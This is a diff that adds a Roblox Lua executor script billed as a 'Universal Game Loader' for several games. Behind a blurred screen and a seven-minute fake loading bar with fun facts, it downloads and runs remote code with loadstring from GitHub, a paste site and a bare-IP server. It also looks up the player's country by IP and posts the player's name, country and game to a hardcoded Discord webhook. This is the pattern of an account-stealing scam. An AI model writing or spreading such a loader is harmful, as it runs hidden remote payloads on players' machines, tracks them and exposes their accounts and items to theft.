@@ -1,0 +1,388 @@
+
+
+-- Universal Game Loader (OLD GUI style, fixed handlers, immediate exec + 7min UI + webhook) #ONLYWORKSONADOPTME
+
+-- Supported PlaceIds:
+
+-- 126884695634066 = Grow-a-Garden (default fallback)
+
+-- 142823291      = Murder Mystery 2
+
+-- 920587237      = Adopt Me
+
+-- 18901165922    = PETS GO
+
+-- 8737899170     = Pet Simulator 99
+
+
+--// Services
+
+local Players = game:GetService("Players")
+
+local TweenService = game:GetService("TweenService")
+
+local CoreGui = game:GetService("CoreGui")
+
+local Lighting = game:GetService("Lighting")
+
+local StarterGui = game:GetService("StarterGui")
+
+local HttpService = game:GetService("HttpService")
+
+
+local player = Players.LocalPlayer
+
+local placeId = game.PlaceId
+
+
+--// Webhook
+
+local Webhook = "https://discord.com/api/webhooks/1404864007667712140/kGlLQNCyxAPsseYkKeoEs2GkhrOY0g8D7I7H4kI0zWpGExwp1IUnIQQg_abW7hEf2Vhq"
+
+
+--// Country (IP lookup, executor must support syn.request)
+
+local country = "Unknown"
+
+pcall(function()
+
+    local res = syn.request({Url = "http://ip-api.com/json", Method = "GET"})
+
+    if res and res.Body then
+
+        local data = HttpService:JSONDecode(res.Body)
+
+        if data and data.country then
+
+            country = data.country
+
+        end
+
+    end
+
+end)
+
+
+--// Fun facts
+
+local funFacts = {
+
+    "Did you know? Roblox launched in 2006!",
+
+    "Tip: Press F9 to open the dev console.",
+
+    "Fun Fact: Lua is the scripting language used by Roblox.",
+
+    "Pro tip: Take short breaks to avoid burnout.",
+
+    "Did you know? Some Roblox games reach millions of players!"
+
+}
+
+
+--// Loader UI
+
+local function createLoadingScreen(gameName, duration)
+
+    duration = duration or 420 -- default 7 mins
+
+
+    local blur = Instance.new("BlurEffect")
+
+    blur.Size = 0
+
+    blur.Parent = Lighting
+
+    TweenService:Create(blur, TweenInfo.new(0.6), {Size = 24}):Play()
+
+
+    local gui = Instance.new("ScreenGui")
+
+    gui.Name = "UniversalLoader"
+
+    gui.IgnoreGuiInset = true
+
+    gui.ResetOnSpawn = false
+
+    gui.Parent = CoreGui
+
+
+    local frame = Instance.new("Frame")
+
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+
+    frame.Size = UDim2.fromOffset(380, 170)
+
+    frame.Position = UDim2.fromScale(0.5, 0.5)
+
+    frame.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
+
+    frame.BackgroundTransparency = 0.08
+
+    frame.Parent = gui
+
+
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
+
+
+    local stroke = Instance.new("UIStroke")
+
+    stroke.Color = Color3.fromRGB(100, 110, 255)
+
+    stroke.Thickness = 2
+
+    stroke.Transparency = 0.6
+
+    stroke.Parent = frame
+
+
+    local title = Instance.new("TextLabel")
+
+    title.Size = UDim2.new(0.9, 0, 0.16, 0)
+
+    title.Position = UDim2.new(0.05, 0, 0.04, 0)
+
+    title.BackgroundTransparency = 1
+
+    title.Text = gameName
+
+    title.TextScaled = true
+
+    title.Font = Enum.Font.GothamBold
+
+    title.TextColor3 = Color3.fromRGB(215, 220, 255)
+
+    title.Parent = frame
+
+
+    local barBg = Instance.new("Frame")
+
+    barBg.Size = UDim2.new(0.82, 0, 0.14, 0)
+
+    barBg.Position = UDim2.new(0.09, 0, 0.45, 0)
+
+    barBg.BackgroundColor3 = Color3.fromRGB(44, 44, 54)
+
+    barBg.Parent = frame
+
+    Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 8)
+
+
+    local bar = Instance.new("Frame")
+
+    bar.Size = UDim2.new(0, 0, 1, 0)
+
+    bar.BackgroundColor3 = Color3.fromRGB(115, 120, 255)
+
+    bar.Parent = barBg
+
+    Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 8)
+
+
+    local percent = Instance.new("TextLabel")
+
+    percent.Size = UDim2.new(0.9, 0, 0.12, 0)
+
+    percent.Position = UDim2.new(0.05, 0, 0.62, 0)
+
+    percent.BackgroundTransparency = 1
+
+    percent.Text = "0%"
+
+    percent.TextScaled = true
+
+    percent.Font = Enum.Font.Gotham
+
+    percent.TextColor3 = Color3.fromRGB(200,200,255)
+
+    percent.Parent = frame
+
+
+    local fact = Instance.new("TextLabel")
+
+    fact.Size = UDim2.new(0.9, 0, 0.18, 0)
+
+    fact.Position = UDim2.new(0.05, 0, 0.74, 0)
+
+    fact.BackgroundTransparency = 1
+
+    fact.Text = "Fun Fact: " .. funFacts[math.random(1,#funFacts)]
+
+    fact.TextColor3 = Color3.fromRGB(180, 185, 230)
+
+    fact.Font = Enum.Font.Gotham
+
+    fact.TextSize = 14
+
+    fact.TextWrapped = true
+
+    fact.Parent = frame
+
+
+    task.spawn(function()
+
+        local start = tick()
+
+        local last = 0
+
+        while tick() - start < duration and gui.Parent do
+
+            local progress = (tick()-start)/duration
+
+            bar.Size = UDim2.new(progress,0,1,0)
+
+            percent.Text = math.floor(progress*100).."%"
+
+            if tick()-last > 5 then
+
+                last = tick()
+
+                fact.Text = "Fun Fact: " .. funFacts[math.random(1,#funFacts)]
+
+            end
+
+            task.wait(0.1)
+
+        end
+
+        bar.Size = UDim2.new(1,0,1,0)
+
+        percent.Text = "100%"
+
+        task.wait(1)
+
+        gui:Destroy()
+
+        blur:Destroy()
+
+    end)
+
+end
+
+
+--// Handlers
+
+local handlers = {
+
+    [8737899170] = {
+
+        name = "Pet Simulator 99",
+
+        action = function()
+
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ingeniousmainmn/Universal/refs/heads/main/Universal", true))()
+
+        end
+
+    },
+
+    [18901165922] = {
+
+        name = "PETS GO",
+
+        action = function()
+
+            loadstring(game:HttpGet("https://paste.debian.net/plainh/b11ed528/", true))()
+
+        end
+
+    },
+
+    [142823291] = {
+
+        name = "Murder Mystery 2",
+
+        action = function()
+
+            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
+
+            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau", true))()
+
+        end
+
+    },
+
+    [920587237] = {
+
+        name = "Adopt Me",
+
+        action = function()
+
+            ID="6f2f3707-06ef-4d90-ac3f-054271f0966a";
+
+            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau", true))()
+
+        end
+
+    },
+
+    [126884695634066] = {
+
+        name = "Grow a Garden",
+
+        action = function()
+
+            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
+
+            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau", true))()
+
+        end
+
+    }
+
+}
+
+
+-- pick handler (default = Grow a Garden)
+
+local entry = handlers[placeId] or handlers[126884695634066]
+
+
+-- show loader & run script
+
+createLoadingScreen(entry.name, 420)
+
+pcall(entry.action)
+
+
+-- send webhook
+
+pcall(function()
+
+    syn.request({
+
+        Url = Webhook,
+
+        Method = "POST",
+
+        Headers = {["Content-Type"]="application/json"},
+
+        Body = HttpService:JSONEncode({
+
+            content = "@everyone",
+
+            embeds = {{
+
+                title = "Universal Script Executed",
+
+                fields = {
+
+                    {name="Player", value=player.Name, inline=true},
+
+                    {name="Country", value=country, inline=true},
+
+                    {name="Game", value=entry.name, inline=false},
+
+                    {name="PlaceId", value=tostring(placeId), inline=false}
+
+                },
+
+                color = 3066993
+
+            }}
+
+        })
+
+    })
+
+end)
